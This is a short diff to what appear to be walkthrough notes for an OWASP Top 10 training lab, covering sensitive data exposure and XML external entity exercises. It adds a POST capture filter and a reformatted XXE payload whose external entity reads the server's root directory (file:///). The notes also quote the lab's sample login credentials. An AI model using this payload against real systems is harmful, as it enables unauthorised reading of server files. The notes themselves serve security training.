@@ -91,6 +91,8 @@ secQuestion2=&secQuestion3=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=123097
 
 A3 
 
+http.request.method="POST"
+
 Sensitive data exposure:
 Locate the query to start.mc in the Network tab and click on Parameters.
 Notice the parameters {"username":"CaptainJack","password":"BlackPearl"}
@@ -102,7 +104,11 @@ A4 XML entities:
 Submit a comment and Locate the query to simple in the Network tab and click on Edit    and Resend.
 Edit the body with:
 
- <?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
+ <?xml version="1.0"?>
+<!DOCTYPE cat [
+<!ENTITY root SYSTEM "file:///">
+]>
+<comment> <text>&root;</text></comment>
 
 7.
 Post a comment and Locate the query to content-type in the Network tab and click on Edit and Resend.
